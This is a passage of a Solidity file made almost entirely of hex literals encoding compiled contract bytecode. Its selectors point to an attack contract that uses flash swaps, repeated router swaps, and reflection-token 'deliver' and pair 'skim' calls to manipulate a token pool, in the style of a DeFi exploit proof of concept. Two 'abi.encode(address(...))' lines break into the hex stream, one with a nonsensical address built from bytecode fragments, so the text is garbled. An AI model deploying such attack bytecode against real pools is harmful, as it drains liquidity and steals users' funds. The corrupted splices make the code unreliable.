            hex"ffffffffff16021790555081600660006101000a81548173ffffffffffffffff",
            hex"ffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffff",
            hex"ffffffffffff16021790555080600760006101000a81548173ffffffffffffff",
            hex"ffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffff",
            hex"ffffffffffffff1602179055506000600167ffffffffffffffff811115610c89",
            hex"57610c8861339f565b5b60405190808252806020026020018201604052801561",
            hex"0cb75781602001602082028036833780820191505090505b5090506002600090",
            hex"54906101000a900473ffffffffffffffffffffffffffffffffffffffff168160",
            hex"0081518110610cf157610cf0613bed565b5b602002602001019073ffffffffff",
            hex"ffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffff",
            hex"ffffffffffffff16815250506000600167ffffffffffffffff811115610d4857",
            hex"610d4761339f565b5b604051908082528060200260200182016040528015610d",
            hex"765781602001602082028036833780820191505090505b509050600069043c33",
            hex"c193756480000082600081518110610d9a57610d99613bed565b5b6020026020",
            hex"01018181525050600360009054906101000a900473ffffffffffffffffffffff",
            hex"ffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16",
            hex"635c38449e3085856040518463ffffffff1660e01b8152600401610e05939291",
            hex"90613e02565b600060405180830381600087803b158015610e1f57600080fd5b",
            hex"505af1158015610e33573d6000803e3d6000fd5b50505050505050505050565b",
            hex"60008060009054906101000a900473ffffffffffffffffffffffffffffffffff",
            hex"ffffff16905090565b600660009054906101000a900473ffffffffffffffffff",
            hex"ffffffffffffffffffffff1681565b600160009054906101000a900473ffffff",
            hex"ffffffffffffffffffffffffffffffffff1681565b600360009054906101000a",
            hex"900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffff",
            hex"ffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffff",
            hex"ffffffff1614610f0e57600080fd5b610f16611180565b83600081518110610f",
            hex"2a57610f29613bed565b5b602002602001015173ffffffffffffffffffffffff",
            hex"ffffffffffffffff1663a9059cbb600360009054906101000a900473ffffffff",
            hex"ffffffffffffffffffffffffffffffff1684600081518110610f8457610f8361",
            hex"3bed565b5b602002602001015186600081518110610fa057610f9f613bed565b",
            hex"5b6020026020010151610fb29190613a71565b6040518363ffffffff1660e01b",
            hex"8152600401610fcf929190613b05565b6020604051808303816000875af11580",
            hex"15610fee573d6000803e3d6000fd5b505050506040513d601f19601f82011682",
            hex"0180604052508101906110129190613b43565b50600084600081518110611029",
            hex"57611028613bed565b5b602002602001015173ffffffffffffffffffffffffff",
            hex"ffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401",
            hex"61106991906132b3565b602060405180830381865afa158015611086573d6000",
            hex"803e3d6000fd5b505050506040513d601f19601f820116820180604052508101",
            hex"906110aa919061385e565b9050846000815181106110c0576110bf613bed565b",
            hex"5b602002602001015173ffffffffffffffffffffffffffffffffffffffff1663",
            hex"a9059cbb6110eb610e3f565b836040518363ffffffff1660e01b815260040161",
            hex"1109929190613b05565b6020604051808303816000875af1158015611128573d",
            hex"6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250",
            hex"81019061114c9190613b43565b505050505050565b7f00000000000000000000",
            hex"00007a250d5630b4cf539739df2c5dacb4c659f2488d81565b60003390509056",
            hex"5b600260009054906101000a900473ffffffffffffffffffffffffffffffffff",
            hex"ffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b360",
            hex"0160009054906101000a900473ffffffffffffffffffffffffffffffffffffff",
            hex"ff167fffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
            hex"ffffff6040518363ffffffff1660e01b815260040161121f929190613b05565b",
            hex"6020604051808303816000875af115801561123e573d6000803e3d6000fd5b50",
            hex"5050506040513d601f19601f820116820180604052508101906112629190613b",
            hex"43565b506000600267ffffffffffffffff8111156112805761127f61339f565b",
            hex"5b6040519080825280602002602001820160405280156112ae57816020016020",
            hex"82028036833780820191505090505b509050600260009054906101000a900473",
            hex"ffffffffffffffffffffffffffffffffffffffff16816000815181106112e857",
            hex"6112e7613bed565b5b602002602001019073ffffffffffffffffffffffffffff",
            hex"ffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff1681",
            hex"525050600560009054906101000a900473ffffffffffffffffffffffffffffff",
            hex"ffffffffff168160018151811061135957611358613bed565b5b602002602001",
            hex"019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffff",
            hex"ffffffffffffffffffffffffffffff16815250506000680405e98a4d7c108000",
            hex"9050600068056bc75e2d631000009050600060016040516020016113c3919061",
            hex"3e69565b6040516020818303038152906040529050600660009054906101000a",
            hex"900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffff",
            hex"ffffffffffffffffffffffffff1663022c0d9f84600030856040518563ffffff",
            hex"ff1660e01b81526004016114369493929190613f2d565b600060405180830381",
            hex"600087803b15801561145057600080fd5b505af1158015611464573d6000803e",
            hex"3d6000fd5b50505050600560009054906101000a900473ffffffffffffffffff",
            hex"ffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffff",
            hex"ff16634549b0398460006040518363ffffffff1660e01b81526004016114c692",
            hex"9190613f79565b602060405180830381865afa1580156114e3573d6000803e3d",
            hex"6000fd5b505050506040513d601f19601f820116820180604052508101906115",
            hex"07919061385e565b6004546115149190613a71565b6004819055506000604051",
            hex"60200161152c9190613e69565b60405160208183030381529060405290506000",
            hex"600260009054906101000a900473ffffffffffffffffffffffffffffffffffff",
            hex"ffff1673ffffffffffffffffffffffffffffffffffffffff166370a082313060",
            hex"40518263ffffffff1660e01b815260040161159a91906132b3565b6020604051",
            hex"80830381865afa1580156115b7573d6000803e3d6000fd5b505050506040513d",
            hex"601f19601f820116820180604052508101906115db919061385e565b905067e8",
            hex"2ce65c5449000093507f0000000000000000000000007a250d5630b4cf539739",
            hex"df2c5dacb4c659f2488d73ffffffffffffffffffffffffffffffffffffffff16",
            hex"638803dbee85838830426040518663ffffffff1660e01b815260040161164995",
            hex"949392919061404f565b6000604051808303816000875af1158015611668573d",
            hex"6000803e3d6000fd5b505050506040513d6000823e3d601f19601f8201168201",
            hex"80604052508101906116919190614140565b50600560009054906101000a9004",
            hex"73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffff",
            hex"ffffffffffffffffffffff16634549b0398560006040518363ffffffff1660e0",
            hex"1b81526004016116f0929190613f79565b602060405180830381865afa158015",
            hex"61170d573d6000803e3d6000fd5b505050506040513d601f19601f8201168201",
            hex"8060405250810190611731919061385e565b60045461173e9190613a71565b60",
            hex"0481905550600660009054906101000a900473ffffffffffffffffffffffffff",
            hex"ffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166302",
            hex"2c0d9f84600030866040518563ffffffff1660e01b81526004016117a6949392",
            hex"9190613f2d565b600060405180830381600087803b1580156117c057600080fd",
            hex"5b505af11580156117d4573d6000803e3d6000fd5b5050505060056000905490",
            hex"6101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffff",
            hex"ffffffffffffffffffffffffffffffffff1663a9059cbb3060016040518363ff",
            hex"ffffff1660e01b81526004016118369291906141c4565b602060405180830381",
            hex"6000875af1158015611855573d6000803e3d6000fd5b505050506040513d601f",
            hex"19601f820116820180604052508101906118799190613b43565b50679a522d15",
            hex"6e580000935060005b600f811215611b36577f0000000000000000000000007a",
            hex"250d5630b4cf539739df2c5dacb4c659f2488d73ffffffffffffffffffffffff",
            hex"ffffffffffffffff16638803dbee86848930426040518663ffffffff1660e01b",
            hex"81526004016118f295949392919061404f565b6000604051808303816000875a",
            hex"f1158015611911573d6000803e3d6000fd5b505050506040513d6000823e3d60",
            hex"1f19601f8201168201806040525081019061193a9190614140565b5060056000",
            hex"9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673",
            hex"ffffffffffffffffffffffffffffffffffffffff16634549b039866000604051",
            hex"8363ffffffff1660e01b8152600401611999929190613f79565b602060405180",
            hex"830381865afa1580156119b6573d6000803e3d6000fd5b505050506040513d60",
            hex"1f19601f820116820180604052508101906119da919061385e565b6004546119",
            hex"e79190613a71565b600481905550600660009054906101000a900473ffffffff",
            hex"ffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffff",
            hex"ffffffffffff1663022c0d9f85600030876040518563ffffffff1660e01b8152",
            hex"600401611a4f9493929190613f2d565b600060405180830381600087803b1580",
            hex"15611a6957600080fd5b505af1158015611a7d573d6000803e3d6000fd5b5050",
            hex"5050600560009054906101000a900473ffffffffffffffffffffffffffffffff",
            hex"ffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb",
            hex"3060016040518363ffffffff1660e01b8152600401611adf9291906141c4565b",
            hex"6020604051808303816000875af1158015611afe573d6000803e3d6000fd5b50",
            hex"5050506040513d601f19601f82011682018060405250810190611b229190613b",
            hex"43565b508080611b2e906141f7565b915050611888565b506776d3c16f38ce00",
            hex"0093507f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c6",
            hex"59f2488d73ffffffffffffffffffffffffffffffffffffffff16638803dbee85",
            hex"838830426040518663ffffffff1660e01b8152600401611ba395949392919061",
            hex"404f565b6000604051808303816000875af1158015611bc2573d6000803e3d60",
            hex"00fd5b505050506040513d6000823e3d601f19601f8201168201806040525081",
            hex"0190611beb9190614140565b50600560009054906101000a900473ffffffffff",
            hex"ffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffff",
            hex"ffffffffff16634549b0398560006040518363ffffffff1660e01b8152600401",
            hex"611c4a929190613f79565b602060405180830381865afa158015611c67573d60",
            hex"00803e3d6000fd5b505050506040513d601f19601f8201168201806040525081",
            hex"0190611c8b919061385e565b600454611c989190613a71565b60048190555060",
            hex"0660009054906101000a900473ffffffffffffffffffffffffffffffffffffff",
            hex"ff1673ffffffffffffffffffffffffffffffffffffffff1663022c0d9f68042c",
            hex"96f40959140000600030866040518563ffffffff1660e01b8152600401611d09",
            hex"949392919061427a565b600060405180830381600087803b158015611d235760",
            hex"0080fd5b505af1158015611d37573d6000803e3d6000fd5b5050505060056000",
            hex"9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673",
            hex"ffffffffffffffffffffffffffffffffffffffff1663a9059cbb306001604051",
            hex"8363ffffffff1660e01b8152600401611d999291906141c4565b602060405180",
            hex"8303816000875af1158015611db8573d6000803e3d6000fd5b50505050604051",
            hex"3d601f19601f82011682018060405250810190611ddc9190613b43565b506000",
            hex"600560009054906101000a900473ffffffffffffffffffffffffffffffffffff",
            hex"ffff1673ffffffffffffffffffffffffffffffffffffffff166370a082313060",
            hex"40518263ffffffff1660e01b8152600401611e3a91906132b3565b6020604051",
            hex"80830381865afa158015611e57573d6000803e3d6000fd5b505050506040513d",
            hex"601f19601f82011682018060405250810190611e7b919061385e565b90506002",
            hex"60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff",
            hex"1673ffffffffffffffffffffffffffffffffffffffff166370a0823130604051",
            hex"8263ffffffff1660e01b8152600401611ed891906132b3565b60206040518083",
            hex"0381865afa158015611ef5573d6000803e3d6000fd5b505050506040513d601f",
            hex"19601f82011682018060405250810190611f19919061385e565b915060006005",
            hex"60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff",
            hex"1673ffffffffffffffffffffffffffffffffffffffff166318160ddd60405181",
            hex"63ffffffff1660e01b8152600401602060405180830381865afa158015611f8a",
            hex"573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040",
            hex"5250810190611fae919061385e565b9050600060018383611fc091906138e456",
            hex"5b611fca91906138e4565b90507f0000000000000000000000007a250d5630b4",
            hex"cf539739df2c5dacb4c659f2488d73ffffffffffffffffffffffffffffffffff",
            hex"ffffff16638803dbee82868b30426040518663ffffffff1660e01b8152600401",
            hex"61202d95949392919061404f565b6000604051808303816000875af115801561",
            hex"204c573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f82",
            hex"0116820180604052508101906120759190614140565b50600560009054906101",
            hex"000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffff",
            hex"ffffffffffffffffffffffffffffff1663a9059cbb3060016040518363ffffff",
            hex"ff1660e01b81526004016120d49291906141c4565b6020604051808303816000",
            hex"875af11580156120f3573d6000803e3d6000fd5b505050506040513d601f1960",
            hex"1f820116820180604052508101906121179190613b43565b5060026000905490",
            hex"6101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffff",
            hex"ffffffffffffffffffffffffffffffffff166370a08231306040518263ffffff",
            hex"ff1660e01b815260040161217391906132b3565b602060405180830381865afa",
            hex"158015612190573d6000803e3d6000fd5b505050506040513d601f19601f8201",
            hex"16820180604052508101906121b4919061385e565b9350600060056000905490",
            hex"6101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffff",
            hex"ffffffffffffffffffffffffffffffffff166370a08231600660009054906101",
            hex"000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ff",
            hex"ffffff1660e01b815260040161223591906132b3565b60206040518083038186",
            hex"5afa158015612252573d6000803e3d6000fd5b505050506040513d601f19601f",
            hex"82011682018060405250810190612276919061385e565b905060646001846122",
            hex"879190613a2f565b6122919190613ad4565b8161229c91906138e4565b91507f",
            abi.encode(address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)),
            hex"73ffffffffffffffffffffffffffffffffffffffff16638803dbee83878c6007",
            hex"60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff",
            hex"16426040518663ffffffff1660e01b815260040161232195949392919061404f",
            hex"565b6000604051808303816000875af1158015612340573d6000803e3d6000fd",
            hex"5b505050506040513d6000823e3d601f19601f82011682018060405250810190",
            hex"6123699190614140565b50600560009054906101000a900473ffffffffffffff",
            hex"ffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffff",
            hex"ffffff1663a9059cbb3060016040518363ffffffff1660e01b81526004016123",
            hex"c89291906141c4565b6020604051808303816000875af11580156123e7573d60",
            hex"00803e3d6000fd5b505050506040513d601f19601f8201168201806040525081",
            hex"019061240b9190613b43565b50606460638461241b9190613a2f565b61242591",
            hex"90613ad4565b935060005b601a811215612a1d57600260009054906101000a90",
            hex"0473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffff",
            hex"ffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b",
            hex"815260040161248e91906132b3565b602060405180830381865afa1580156124",
            hex"ab573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060",
            hex"4052508101906124cf919061385e565b9550600560009054906101000a900473",
            hex"ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffff",
            hex"ffffffffffffffffffff166370a08231600660009054906101000a900473ffff",
            hex"ffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b",
            hex"815260040161254e91906132b3565b602060405180830381865afa1580156125",
            hex"6b573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060",
            hex"40525081019061258f919061385e565b91506000600560009054906101000a90",
            hex"0473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffff",
            hex"ffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b",
            hex"81526004016125ee91906132b3565b602060405180830381865afa1580156126",
            hex"0b573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060",
            hex"40525081019061262f919061385e565b905060646001866126409190613a2f56",
            hex"5b61264a9190613ad4565b8310612750576103e860646001876126629190613a",
            hex"2f565b61266c9190613ad4565b8461267791906138e4565b6126819190613a71",
            hex"565b93507f0000000000000000000000007a250d5630b4cf539739df2c5dacb4",
            hex"c659f2488d73ffffffffffffffffffffffffffffffffffffffff16638803dbee",
            hex"85898e600760009054906101000a900473ffffffffffffffffffffffffffffff",
            hex"ffffffffff16426040518663ffffffff1660e01b815260040161270695949392",
            hex"919061404f565b6000604051808303816000875af1158015612725573d600080",
            hex"3e3d6000fd5b505050506040513d6000823e3d601f19601f8201168201806040",
            hex"525081019061274e9190614140565b505b6103e88561275e91906138e4565b81",
            hex"101561282b57806103e88661277491906138e4565b61277e91906138e4565b93",
            hex"507f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2",
            hex"488d73ffffffffffffffffffffffffffffffffffffffff16638803dbee85898e",
            hex"30426040518663ffffffff1660e01b81526004016127e195949392919061404f",
            hex"565b6000604051808303816000875af1158015612800573d6000803e3d6000fd",
            hex"5b505050506040513d6000823e3d601f19601f82011682018060405250810190",
            hex"6128299190614140565b505b600560009054906101000a900473ffffffffffff",
            hex"ffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffff",
            hex"ffffffff16633bd5d173876040518263ffffffff1660e01b8152600401612886",
            hex"919061389a565b600060405180830381600087803b1580156128a057600080fd",
            hex"5b505af11580156128b4573d6000803e3d6000fd5b5050505060066000905490",
            hex"6101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffff",
            hex"ffffffffffffffffffffffffffffffffff1663bc25cf77600760009054906101",
            hex"000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ff",
            hex"ffffff1660e01b815260040161293591906132b3565b60006040518083038160",
            hex"0087803b15801561294f57600080fd5b505af1158015612963573d6000803e3d",
            hex"6000fd5b50505050600560009054906101000a900473ffffffffffffffffffff",
            hex"ffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff",
            hex"1663a9059cbb3060016040518363ffffffff1660e01b81526004016129c59291",
            hex"906141c4565b6020604051808303816000875af11580156129e4573d6000803e",
            hex"3d6000fd5b505050506040513d601f19601f8201168201806040525081019061",
            hex"2a089190613b43565b50508080612a15906141f7565b91505061242a565b5060",
            hex"00600560009054906101000a900473ffffffffffffffffffffffffffffffffff",
            hex"ffffff1673ffffffffffffffffffffffffffffffffffffffff16634549b03985",
            hex"60006040518363ffffffff1660e01b8152600401612a7e929190613f79565b60",
            hex"2060405180830381865afa158015612a9b573d6000803e3d6000fd5b50505050",
            hex"6040513d601f19601f82011682018060405250810190612abf919061385e565b",
            hex"90506000846002612ad09190613a2f565b82612adb91906138e4565b90506000",
            hex"620f4240620fdb77600560009054906101000a900473ffffffffffffffffffff",
            hex"ffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff",
            hex"16632d838119856040518263ffffffff1660e01b8152600401612b4291906138",
            hex"9a565b602060405180830381865afa158015612b5f573d6000803e3d6000fd5b",
            hex"505050506040513d601f19601f82011682018060405250810190612b83919061",
            hex"385e565b612b8d9190613a2f565b612b979190613ad4565b9050600560009054",
            hex"906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffff",
            hex"ffffffffffffffffffffffffffffffffffff16633bd5d173826040518263ffff",
            hex"ffff1660e01b8152600401612bf4919061389a565b6000604051808303816000",
            hex"87803b158015612c0e57600080fd5b505af1158015612c22573d6000803e3d60",
            hex"00fd5b505050506000600560009054906101000a900473ffffffffffffffffff",
            hex"ffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffff",
            hex"ff166370a08231306040518263ffffffff1660e01b8152600401612c83919061",
            hex"32b3565b602060405180830381865afa158015612ca0573d6000803e3d6000fd",
            hex"5b505050506040513d601f19601f82011682018060405250810190612cc49190",
            hex"61385e565b9050600560009054906101000a900473ffffffffffffffffffffff",
            hex"ffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16",
            hex"63a9059cbb600660009054906101000a900473ffffffffffffffffffffffffff",
            hex"ffffffffffffff16620f4240620e7df785612d3a9190613a2f565b612d449190",
            hex"613ad4565b6040518363ffffffff1660e01b8152600401612d61929190613b05",
            hex"565b6020604051808303816000875af1158015612d80573d6000803e3d6000fd",
            hex"5b505050506040513d601f19601f82011682018060405250810190612da49190",
            hex"613b43565b50505050506000806000600660009054906101000a900473ffffff",
            hex"ffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffff",
            hex"ffffffffffffff16630902f1ac6040518163ffffffff1660e01b815260040160",
            hex"6060405180830381865afa158015612e1b573d6000803e3d6000fd5b50505050",
            hex"6040513d601f19601f82011682018060405250810190612e3f919061399a565b",
            hex"826dffffffffffffffffffffffffffff169250816dffffffffffffffffffffff",
            hex"ffffff1691505080935081945050506000600260009054906101000a900473ff",
            hex"ffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffff",
            hex"ffffffffffffffffff166370a08231600660009054906101000a900473ffffff",
            hex"ffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b81",
            hex"52600401612eed91906132b3565b602060405180830381865afa158015612f0a",
            hex"573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040",
            hex"5250810190612f2e919061385e565b90506000600560009054906101000a9004",
            hex"73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffff",
            hex"ffffffffffffffffffffff166370a08231600660009054906101000a900473ff",
            hex"ffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e0",
            hex"1b8152600401612faf91906132b3565b602060405180830381865afa15801561",
            hex"2fcc573d6000803e3d6000fd5b505050506040513d601f19601f820116820180",
            hex"60405250810190612ff0919061385e565b90506103e860038683613003919061",
            hex"38e4565b61300d9190613a2f565b6103e88361301b9190613a2f565b61302591",
            hex"906138e4565b620f424086886130359190613a2f565b61303f9190613a2f565b",
            hex"6130499190613ad4565b6103e8846130579190613a2f565b61306191906138e4",
            hex"565b61306b9190613ad4565b9250600660009054906101000a900473ffffffff",
            hex"ffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffff",
            hex"ffffffffffff1663022c0d9f600085306040518463ffffffff1660e01b815260",
            hex"04016130cd939291906142c6565b600060405180830381600087803b15801561",
            hex"30e757600080fd5b505af11580156130fb573d6000803e3d6000fd5b50505050",
            hex"5050505050505050505050505050565b6000604051905090565b600080fd5b60",
            hex"0080fd5b600073ffffffffffffffffffffffffffffffffffffffff8216905091",
            hex"9050565b600061314e82613123565b9050919050565b61315e81613143565b81",
            hex"1461316957600080fd5b50565b60008135905061317b81613155565b92915050",
            hex"565b6000819050919050565b61319481613181565b811461319f57600080fd5b",
            hex"50565b6000813590506131b18161318b565b92915050565b600080fd5b600080",
            hex"fd5b600080fd5b60008083601f8401126131dc576131db6131b7565b5b823590",
            hex"5067ffffffffffffffff8111156131f9576131f86131bc565b5b602083019150",
            hex"836001820283011115613215576132146131c1565b5b9250929050565b600080",
            hex"60008060006080868803121561323857613237613119565b5b60006132468882",
            hex"890161316c565b9550506020613257888289016131a2565b9450506040613268",
            hex"888289016131a2565b935050606086013567ffffffffffffffff811115613289",
            hex"5761328861311e565b5b613295888289016131c6565b92509250509295509295",
            hex"909350565b6132ad81613143565b82525050565b60006020820190506132c860",
            hex"008301846132a4565b92915050565b600080604083850312156132e5576132e4",
            hex"613119565b5b60006132f38582860161316c565b925050602061330485828601",
            hex"61316c565b9150509250929050565b6000602082840312156133245761332361",
            hex"3119565b5b60006133328482850161316c565b91505092915050565b60008060",
            hex"006060848603121561335457613353613119565b5b6000613362868287016131",
            hex"6c565b93505060206133738682870161316c565b925050604061338486828701",
            hex"61316c565b9150509250925092565b6000601f19601f8301169050919050565b",
            hex"7f4e487b71000000000000000000000000000000000000000000000000000000",
            hex"00600052604160045260246000fd5b6133d78261338e565b810181811067ffff",
            hex"ffffffffffff821117156133f6576133f561339f565b5b80604052505050565b",
            hex"600061340961310f565b905061341582826133ce565b919050565b600067ffff",
            hex"ffffffffffff8211156134355761343461339f565b5b60208202905060208101",
            hex"9050919050565b600061345182613143565b9050919050565b61346181613446",
            hex"565b811461346c57600080fd5b50565b60008135905061347e81613458565b92",
            hex"915050565b60006134976134928461341a565b6133ff565b9050808382526020",
            hex"82019050602084028301858111156134ba576134b96131c1565b5b835b818110",
            hex"156134e357806134cf888261346f565b84526020840193505060208101905061",
            hex"34bc565b5050509392505050565b600082601f830112613502576135016131b7",
            hex"565b5b8135613512848260208601613484565b91505092915050565b600067ff",
            hex"ffffffffffffff8211156135365761353561339f565b5b602082029050602081",
            hex"019050919050565b600061355a6135558461351b565b6133ff565b9050808382",
            hex"526020820190506020840283018581111561357d5761357c6131c1565b5b835b",
            hex"818110156135a6578061359288826131a2565b84526020840193505060208101",
            hex"905061357f565b5050509392505050565b600082601f8301126135c5576135c4",
            hex"6131b7565b5b81356135d5848260208601613547565b91505092915050565b60",
            hex"0080fd5b600067ffffffffffffffff8211156135fe576135fd61339f565b5b61",
            hex"36078261338e565b9050602081019050919050565b8281833760008383015250",
            hex"5050565b6000613636613631846135e3565b6133ff565b905082815260208101",
            hex"848484011115613652576136516135de565b5b61365d848285613614565b5093",
            hex"92505050565b600082601f83011261367a576136796131b7565b5b813561368a",
            hex"848260208601613623565b91505092915050565b600080600080608085870312",
            hex"156136ad576136ac613119565b5b600085013567ffffffffffffffff81111561",
            hex"36cb576136ca61311e565b5b6136d7878288016134ed565b9450506020850135",
            hex"67ffffffffffffffff8111156136f8576136f761311e565b5b61370487828801",
            hex"6135b0565b935050604085013567ffffffffffffffff81111561372557613724",
            hex"61311e565b5b613731878288016135b0565b925050606085013567ffffffffff",
            hex"ffffff8111156137525761375161311e565b5b61375e87828801613665565b91",
            hex"505092959194509250565b6000819050919050565b600061378f61378a613785",
            hex"84613123565b61376a565b613123565b9050919050565b60006137a182613774",
            hex"565b9050919050565b60006137b382613796565b9050919050565b6137c38161",
            hex"37a8565b82525050565b60006020820190506137de60008301846137ba565b92",
            hex"915050565b60008115159050919050565b6137f9816137e4565b811461380457",
            hex"600080fd5b50565b600081359050613816816137f0565b92915050565b600060",
            hex"20828403121561383257613831613119565b5b60006138408482850161380756",
            hex"5b91505092915050565b6000815190506138588161318b565b92915050565b60",
            hex"006020828403121561387457613873613119565b5b6000613882848285016138",
            hex"49565b91505092915050565b61389481613181565b82525050565b6000602082",
            hex"0190506138af600083018461388b565b92915050565b7f4e487b710000000000",
            hex"0000000000000000000000000000000000000000000000600052601160045260",
            hex"246000fd5b60006138ef82613181565b91506138fa83613181565b9250828203",
            hex"905081811115613912576139116138b5565b5b92915050565b60006dffffffff",
            hex"ffffffffffffffffffff82169050919050565b61393b81613918565b81146139",
            hex"4657600080fd5b50565b60008151905061395881613932565b92915050565b60",
            hex"0063ffffffff82169050919050565b6139778161395e565b8114613982576000",
            hex"80fd5b50565b6000815190506139948161396e565b92915050565b6000806000",
            hex"606084860312156139b3576139b2613119565b5b60006139c186828701613949",
            hex"565b93505060206139d286828701613949565b92505060406139e38682870161",
            hex"3985565b9150509250925092565b6000815190506139fc81613155565b929150",
            hex"50565b600060208284031215613a1857613a17613119565b5b6000613a268482",
            hex"85016139ed565b91505092915050565b6000613a3a82613181565b9150613a45",
            hex"83613181565b9250828202613a5381613181565b91508282048414831517613a",
            hex"6a57613a696138b5565b5b5092915050565b6000613a7c82613181565b915061",
            hex"3a8783613181565b9250828201905080821115613a9f57613a9e6138b5565b5b",
            hex"92915050565b7f4e487b71000000000000000000000000000000000000000000",
            hex"00000000000000600052601260045260246000fd5b6000613adf82613181565b",
            hex"9150613aea83613181565b925082613afa57613af9613aa5565b5b8282049050",
            hex"92915050565b6000604082019050613b1a60008301856132a4565b613b276020",
            hex"83018461388b565b9392505050565b600081519050613b3d816137f0565b9291",
            hex"5050565b600060208284031215613b5957613b58613119565b5b6000613b6784",
            hex"828501613b2e565b91505092915050565b600082825260208201905092915050",
            hex"565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f77",
            hex"6e6572600082015250565b6000613bb7602083613b70565b9150613bc282613b",
            hex"81565b602082019050919050565b60006020820190508181036000830152613b",
            hex"e681613baa565b9050919050565b7f4e487b7100000000000000000000000000",
            abi.encode(address(0x000000600052603260045260246000FD5B600061)),
            hex"3c2782613796565b9050919050565b613c3781613c1c565b82525050565b6000",
            hex"81519050919050565b600082825260208201905092915050565b600081905060",
            hex"2082019050919050565b6000613c7482613796565b9050919050565b613c8481",
            hex"613c69565b82525050565b6000613c968383613c7b565b602083019050929150",
            hex"50565b6000602082019050919050565b6000613cba82613c3d565b613cc48185",
            hex"613c48565b9350613ccf83613c59565b8060005b83811015613d00578151613c",
            hex"e78882613c8a565b9750613cf283613ca2565b925050600181019050613cd356",
            hex"5b5085935050505092915050565b600081519050919050565b60008282526020",
            hex"8201905092915050565b6000819050602082019050919050565b613d42816131",
            hex"81565b82525050565b6000613d548383613d39565b6020830190509291505056",
            hex"5b6000602082019050919050565b6000613d7882613d0d565b613d828185613d",
            hex"18565b9350613d8d83613d29565b8060005b83811015613dbe578151613da588",
            hex"82613d48565b9750613db083613d60565b925050600181019050613d91565b50",
            hex"85935050505092915050565b600082825260208201905092915050565b50565b",
            hex"6000613dec600083613dcb565b9150613df782613ddc565b6000820190509190",
            hex"50565b6000608082019050613e176000830186613c2e565b8181036020830152",
            hex"613e298185613caf565b90508181036040830152613e3d8184613d6d565b9050",
            hex"8181036060830152613e5081613ddf565b9050949350505050565b613e638161",
            hex"37e4565b82525050565b6000602082019050613e7e6000830184613e5a565b92",
            hex"915050565b6000819050919050565b6000613ea9613ea4613e9f84613e84565b",
            hex"61376a565b613181565b9050919050565b613eb981613e8e565b82525050565b",
            hex"600081519050919050565b60005b83811015613ee85780820151818401526020",
            hex"81019050613ecd565b60008484015250505050565b6000613eff82613ebf565b",
            hex"613f098185613dcb565b9350613f19818560208601613eca565b613f22816133",
            hex"8e565b840191505092915050565b6000608082019050613f4260008301876138",
            hex"8b565b613f4f6020830186613eb0565b613f5c60408301856132a4565b818103",
            hex"6060830152613f6e8184613ef4565b905095945050505050565b600060408201",
            hex"9050613f8e600083018561388b565b613f9b6020830184613e5a565b93925050",
            hex"50565b600081519050919050565b6000819050602082019050919050565b613f",
            hex"c681613143565b82525050565b6000613fd88383613fbd565b60208301905092",
            hex"915050565b6000602082019050919050565b6000613ffc82613fa2565b614006",
            hex"8185613c48565b935061401183613fad565b8060005b83811015614042578151",
            hex"6140298882613fcc565b975061403483613fe4565b9250506001810190506140",
            hex"15565b5085935050505092915050565b600060a0820190506140646000830188",
            hex"61388b565b614071602083018761388b565b8181036040830152614083818661",
            hex"3ff1565b905061409260608301856132a4565b61409f608083018461388b565b",
